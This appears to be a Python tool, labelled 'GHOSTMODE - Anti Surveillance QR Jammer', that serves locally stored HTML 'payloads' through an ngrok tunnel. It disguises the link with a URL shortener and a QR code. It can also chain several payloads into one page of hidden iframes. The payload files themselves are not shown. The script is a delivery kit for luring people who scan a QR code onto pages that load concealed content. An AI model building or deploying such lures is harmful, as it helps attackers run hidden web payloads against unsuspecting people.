import os
import subprocess
import time
import json
import qrcode
import requests
from pathlib import Path
import socket

PAYLOADS_DIR = "ghost_payloads"
QR_DIR = "ghost_qr"
LOG_FILE = "logs/ghost_events.log"

os.makedirs(QR_DIR, exist_ok=True)

def is_flask_up():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(1)
        return sock.connect_ex(("127.0.0.1", 5000)) == 0

def launch_flask():
    print(" Launching Flask ghost server...")
    subprocess.Popen(["python3", "ghost_server.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(10):
        if is_flask_up():
            print(" Flask server is ready on port 5000.")
            return
        time.sleep(1)
    print(" Flask failed to launch.")
    exit(1)

def launch_ngrok():
    print(" Launching Ngrok tunnel...")
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        return r.json()["tunnels"][0]["public_url"]
    except:
        print(" Ngrok tunnel failed.")
        return None

def shorten_url(url):
    try:
        print(" Shortening URL...")
        r = requests.get("https://is.gd/create.php", params={"format": "simple", "url": url})
        return r.text.strip()
    except:
        return url

def generate_qr(url, name):
    out = os.path.join(QR_DIR, f"{name}_qr.png")
    qrcode.make(url).save(out)
    print(f" QR Code saved to: {out}")

def select_payload():
    payloads = list_payloads()
    print(" Available Payloads:")
    for i, f in enumerate(payloads, 1):
        print(f"[{i}] {f}")
    print(f"[{len(payloads)+1}] Chain Multiple Payloads")

    choice = input(" Select a payload: ").strip()
    if not choice.isdigit():
        return None
    idx = int(choice) - 1

    if idx == len(payloads):
        indices = input(" Enter comma-separated payload numbers to chain: ").split(",")
        try:
            selected = [int(i.strip()) - 1 for i in indices]
            return build_chained_payload(selected)
        except:
            print(" Invalid input.")
            return None
    elif 0 <= idx < len(payloads):
        return payloads[idx]
    else:
        return None

def build_chained_payload(selected):
    paths = [os.path.join(PAYLOADS_DIR, list_payloads()[i]) for i in selected]
    lines = []
    for f in paths:
        if f.endswith(".html"):
            lines.append(f'<iframe src="{os.path.basename(f)}" style="display:none;"></iframe>')
    chained_path = os.path.join(PAYLOADS_DIR, "chained_payload.html")
    with open(chained_path, "w") as f:
        f.write("<!DOCTYPE html><html><body>\n" + "\n".join(lines) + "\n</body></html>")
    return "chained_payload.html"

def list_payloads():
    return sorted([f for f in os.listdir(PAYLOADS_DIR) if f.endswith(".html")])
    
def main():
    print("""
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░   
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
       GHOSTMODE - Anti Surveillance QR Jammer
    """)

    launch_flask()
    public = launch_ngrok()
    if not public:
        return

    filename = select_payload()
    if not filename:
        print(" Invalid payload.")
        return

    link = f"{public}/payloads/{filename}"
    short = shorten_url(link)
    print(f"\n Ghost Payload Link: {short}")
    generate_qr(short, Path(filename).stem)

if __name__ == "__main__":
    main()
